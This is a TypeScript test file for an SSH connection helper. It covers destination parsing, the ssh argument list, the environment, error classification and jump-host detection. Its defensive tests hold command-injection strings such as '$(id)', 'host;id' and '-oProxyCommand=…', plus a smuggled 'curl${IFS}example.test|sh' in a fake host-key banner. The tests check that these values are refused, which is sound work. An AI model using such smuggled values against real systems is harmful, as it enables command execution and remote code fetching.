import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { test } from 'vitest'

import {
  buildResolveArgs,
  buildSshArgs,
  classifySshFailure,
  configHostNames,
  findSshBinary,
  parseDestination,
  parseSshG,
  reachesThroughHop,
  resolveDestination,
  sshEnvironment,
} from './ssh-command'

const destination = (text: string) => {
  const parsed = parseDestination(text)
  assert.ok(parsed.ok, `${text}: ${parsed.ok ? '' : parsed.message}`)
  return parsed.destination
}

test('destinations: aliases, user@host, ports and IPv6 become one ssh word', () => {
  const table: Array<[string, string]> = [
    ['build-box', 'build-box'],
    ['dev@build-box', 'dev@build-box'],
    ['dev@build-box.example.com:2222', 'ssh://dev@build-box.example.com:2222'],
    ['build-box:22', 'ssh://build-box:22'],
    ['[::1]:22', 'ssh://[::1]:22'],
    ['dev@[fe80::1%en0]:2200', 'ssh://dev@[fe80::1%en0]:2200'],
    ['::1', '::1'],
    ['10.0.0.5', '10.0.0.5'],
    ['bücher.example', 'bücher.example'],
    ['  build-box  ', 'build-box'],
  ]
  for (const [input, argv] of table) assert.equal(destination(input).argv, argv, input)
})

test('destinations that could be an option, a shell word or an ssh token are refused in words', () => {
  const hostile = [
    '-oProxyCommand=touch /tmp/x',
    '-p 22 build-box',
    'a b',
    'host;id',
    'host|id',
    'host&id',
    '$(id)',
    '`id`',
    "host'",
    'host"',
    'host\\n',
    'host\nid',
    'host%h',
    'build-box:http',
    'build-box:70000',
    'dev:pw@build-box',
    '',
    '.hidden',
    'a/b',
    '[nothost]:22',
  ]
  for (const text of hostile) {
    const parsed = parseDestination(text)
    assert.equal(parsed.ok, false, JSON.stringify(text))
    if (!parsed.ok) assert.ok(parsed.message.length > 10)
  }
  const option = parseDestination('-oProxyCommand=x')
  assert.ok(!option.ok && /option/u.test(option.message))
})

test('the argv: fixed overrides, the destination after --, batch only when asked', () => {
  const args = buildSshArgs(destination('dev@build-box:2222'), { batch: false })
  assert.deepEqual(args, [
    '-T',
    '-o',
    'RemoteCommand=none',
    '-o',
    'RequestTTY=no',
    '-o',
    'ClearAllForwardings=yes',
    '-o',
    'ForwardAgent=no',
    '-o',
    'ForwardX11=no',
    '-o',
    'ServerAliveInterval=15',
    '-o',
    'ServerAliveCountMax=3',
    '-o',
    'ConnectTimeout=20',
    '--',
    'ssh://dev@build-box:2222',
    'sh',
    '-s',
  ])
  const batch = buildSshArgs(destination('build-box'), { batch: true })
  assert.deepEqual(batch.slice(-6), ['-o', 'BatchMode=yes', '--', 'build-box', 'sh', '-s'])
  for (const forbidden of ['StrictHostKeyChecking', 'accept-new', 'UserKnownHostsFile', 'IdentityFile', 'ProxyCommand'])
    assert.ok(!args.join(' ').includes(forbidden), `${forbidden} is the person's to set`)
  assert.deepEqual(buildResolveArgs(destination('build-box')), ['-G', '--', 'build-box'])
})

test('the environment: prompts to the shim with a per-spawn token, C locale, none in batch', () => {
  const env = sshEnvironment(
    { HOME: '/Users/dev', SSH_AUTH_SOCK: '/tmp/agent.sock', ELECTRON_RUN_AS_NODE: '1', SSH_ASKPASS: '/old' },
    { program: '/app/askpass', socket: '/tmp/s/a.sock', token: 't0k' },
  )
  assert.equal(env.SSH_ASKPASS, '/app/askpass')
  assert.equal(env.SSH_ASKPASS_REQUIRE, 'force')
  assert.equal(env.SPRINTENGINE_ASKPASS_TOKEN, 't0k')
  assert.equal(env.LC_ALL, 'C')
  assert.equal(env.SSH_AUTH_SOCK, '/tmp/agent.sock', "the person's agent is theirs to use")
  assert.equal(env.ELECTRON_RUN_AS_NODE, undefined)
  const batch = sshEnvironment({ SSH_ASKPASS: '/old' }, null)
  assert.equal(batch.SSH_ASKPASS, undefined)
  assert.equal(batch.SSH_ASKPASS_REQUIRE, 'never')
})

test('which ssh: the system one, then PATH; on Windows the inbox OpenSSH before any other', () => {
  assert.equal(findSshBinary({ platform: 'darwin', exists: (path) => path === '/usr/bin/ssh' }), '/usr/bin/ssh')
  assert.equal(findSshBinary({ platform: 'linux', exists: () => false }), 'ssh')
  assert.equal(
    findSshBinary({ platform: 'win32', env: { SystemRoot: 'C:\\Windows' }, exists: () => true }).replace(/\\/gu, '/'),
    'C:\\Windows/System32/OpenSSH/ssh.exe'.replace(/\\/gu, '/'),
  )
  assert.equal(findSshBinary({ platform: 'win32', exists: () => false }), 'ssh.exe')
  assert.equal(findSshBinary({ override: '/opt/ssh' }), '/opt/ssh')
})

test('ssh -G output: the fields shown before a first connect', () => {
  const resolved = parseSshG(
    'host build-box\nuser dev\nhostname 192.0.2.10\nport 2222\nproxyjump bastion\nforwardagent yes\nstricthostkeychecking ask\nuserknownhostsfile ~/.ssh/known_hosts ~/.ssh/known_hosts2\n',
  )
  assert.deepEqual(resolved, {
    hostname: '192.0.2.10',
    user: 'dev',
    port: 2222,
    proxyJump: 'bastion',
    strictHostKeyChecking: 'ask',
    forwardAgent: 'yes',
    controlMaster: null,
    userKnownHostsFile: '~/.ssh/known_hosts ~/.ssh/known_hosts2',
  })
  assert.equal(parseSshG('user dev\n'), null)
  assert.equal(parseSshG('hostname h\nuser u\nport 22\nproxyjump none\n')?.proxyJump, null)
})

test.skipIf(spawnSync('ssh', ['-V']).status !== 0)('ssh -G resolves a URI destination without connecting', async () => {
  const resolved = await resolveDestination('ssh', destination('dev@build-box.example.com:2222'), {
    env: { ...process.env, HOME: '/nonexistent-home' },
  })
  assert.ok(resolved.ok, resolved.ok ? '' : resolved.message)
  if (resolved.ok) {
    assert.equal(resolved.resolved.hostname, 'build-box.example.com')
    assert.equal(resolved.resolved.port, 2222)
    assert.equal(resolved.resolved.user, 'dev')
  }
})

test('config hosts: the plain names, never a pattern', () => {
  const names = configHostNames(
    'Host *\n  ServerAliveInterval 30\nHost build-box mac-mini\n  User dev\nhost *.internal !bad\nHost -oProxyCommand=x\nHost dev-macbook-air\n',
  )
  assert.deepEqual(names, ['build-box', 'dev-macbook-air', 'mac-mini'])
})

// Recorded from OpenSSH 10.0 in the C locale (spec E1.2–E1.5), and the classic texts.
const STDERR = {
  changed: `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
The fingerprint for the ED25519 key sent by the remote host is
SHA256:AbCdEfGhIjKlMnOpQrStUvWxYz0123456789abcdefg.
Please contact your system administrator.
Add correct host key in /Users/dev/.ssh/known_hosts to get rid of this message.
Offending ED25519 key in /Users/dev/.ssh/known_hosts:14
Host key for [127.0.0.1]:2222 has changed and you have requested strict checking.
Host key verification failed.
`,
  verification: 'Host key verification failed.\n',
  denied: 'dev@build-box: Permission denied (publickey,password).\n',
  deniedKey: 'dev@build-box: Permission denied (publickey).\n',
  resolve: 'ssh: Could not resolve hostname host.invalid: nodename nor servname provided, or not known\n',
  resolveLinux: 'ssh: Could not resolve hostname build-box: Name or service not known\n',
  refused: 'ssh: connect to host 127.0.0.1 port 1: Connection refused\n',
  timeout: 'ssh: connect to host 10.255.255.1 port 22: Operation timed out\n',
  keepalive: 'Timeout, server 127.0.0.1 not responding.\n',
  noroute: 'ssh: connect to host 192.0.2.1 port 22: No route to host\n',
  jump: 'channel 0: open failed: connect failed: Name or service not known\nstdio forwarding failed\nkex_exchange_identification: Connection closed by remote host\nConnection closed by UNKNOWN port 65535\n',
  remote: 'Cannot execute command-line and remote command.\n',
  stdio: 'stdio forwarding failed\n',
  closed: 'Connection to 127.0.0.1 closed by remote host.\n',
}

test('ssh failures read as sentences about the machine', () => {
  const read = (text: string, batch = false) => classifySshFailure(text, 'build-box', { batch })
  const changed = read(STDERR.changed)
  assert.equal(changed.code, 'host-key-changed')
  assert.match(changed.message, /ssh-keygen -R \[127\.0\.0\.1\]:2222/u)
  assert.match(changed.message, /known_hosts line 14/u)
  assert.equal(read(STDERR.verification).code, 'host-key-refused')
  assert.equal(read(STDERR.verification, true).code, 'needs-sign-in', 'a reconnect never asks: it says so')
  assert.equal(read(STDERR.denied).code, 'permission-denied')
  assert.match(read(STDERR.denied).message, /publickey, password/u)
  assert.equal(read(STDERR.denied, true).code, 'needs-sign-in')
  assert.equal(read(STDERR.deniedKey, true).code, 'permission-denied', 'a refused key is not fixed by a prompt')
  assert.equal(read(STDERR.resolve).code, 'name-not-resolved')
  assert.equal(read(STDERR.resolveLinux).code, 'name-not-resolved')
  assert.equal(read(STDERR.refused).code, 'connection-refused')
  assert.equal(read(STDERR.timeout).code, 'timed-out')
  assert.equal(read(STDERR.keepalive).code, 'timed-out')
  assert.equal(read(STDERR.noroute).code, 'unreachable')
  assert.equal(read(STDERR.jump).code, 'jump-failed')
  assert.equal(read(STDERR.remote).code, 'remote-command')
  assert.equal(read(STDERR.stdio).code, 'stdio-forwarding')
  assert.equal(read(STDERR.closed).code, 'closed')
  assert.equal(read('something else\n').code, 'unknown')
  for (const text of Object.values(STDERR)) assert.match(read(text).message, /build-box/u)
})

test("a remote's banner cannot put a command into the ssh-keygen line a person copies", () => {
  const banner =
    '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n' +
    '@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\n' +
    'Offending ECDSA key in /tmp/x;id:3\n' +
    'Host key for build-box;curl${IFS}example.test|sh has changed and you have requested strict checking.\n'
  const failure = classifySshFailure(banner, 'build-box')
  assert.equal(failure.code, 'host-key-changed')
  assert.doesNotMatch(failure.message, /curl|;id/u)
  assert.match(failure.message, /ssh-keygen -R <its host name>/u)
  assert.match(failure.message, /your known_hosts file/u)
})

test('on Windows ssh never takes keyboard-interactive, whose question is the remote’s text', () => {
  const windows = buildSshArgs(destination('build-box'), { batch: false, platform: 'win32' })
  assert.deepEqual(windows.slice(-6), ['-o', 'KbdInteractiveAuthentication=no', '--', 'build-box', 'sh', '-s'])
  const mac = buildSshArgs(destination('build-box'), { batch: false, platform: 'darwin' })
  assert.ok(!mac.includes('KbdInteractiveAuthentication=no'))
})

test.skipIf(spawnSync('ssh', ['-V']).status !== 0)(
  'a machine reached through a jump host or a proxy command is told apart from one reached directly',
  async () => {
    const dir = mkdtempSync(join(tmpdir(), 'se-hop-'))
    try {
      const config = join(dir, 'ssh_config')
      writeFileSync(
        config,
        [
          'Host jumped',
          '  HostName 192.0.2.10',
          '  ProxyJump bastion',
          'Host proxied',
          '  HostName 192.0.2.11',
          '  ProxyCommand nc %h %p',
          'Host direct',
          '  HostName 192.0.2.12',
          '',
        ].join('\n'),
      )
      const hop = (name: string) => reachesThroughHop('ssh', destination(name), { configFile: config })
      assert.deepEqual([await hop('jumped'), await hop('proxied'), await hop('direct')], [true, true, false])
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  },
)
